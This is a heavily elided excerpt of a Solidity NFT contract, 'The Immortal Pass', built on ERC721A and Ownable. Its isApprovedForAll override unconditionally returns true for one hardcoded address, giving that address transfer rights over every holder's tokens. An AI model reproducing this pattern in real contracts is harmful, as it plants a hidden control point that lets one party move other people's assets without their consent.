  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x8b233383F3A6B8de1D0aD5f2ED0aD61aA1697Ef6){return true;}
...
contract The_Immortal_Pass is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("The Immortal Pass", "TIP", maxBatchSize_, collectionSize_) {
